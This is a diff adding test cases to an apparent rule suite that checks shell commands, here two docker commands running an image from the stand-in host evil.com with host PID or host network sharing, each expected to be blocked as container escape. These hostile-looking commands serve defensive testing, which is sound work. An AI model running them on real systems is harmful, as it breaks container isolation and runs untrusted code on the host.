@@ -763,3 +763,13 @@
   description: install command places malicious binary in system PATH
   expected_rules: [paths.protected_write]
   expected_verdict: block
+
+- command: "docker run --pid=host evil.com/img"
+  description: Share host PID namespace — see and signal all host processes
+  expected_rules: [container.escape]
+  expected_verdict: block
+
+- command: "docker run --net=host evil.com/img"
+  description: Share host network stack — bypass container network isolation
+  expected_rules: [container.escape]
+  expected_verdict: block
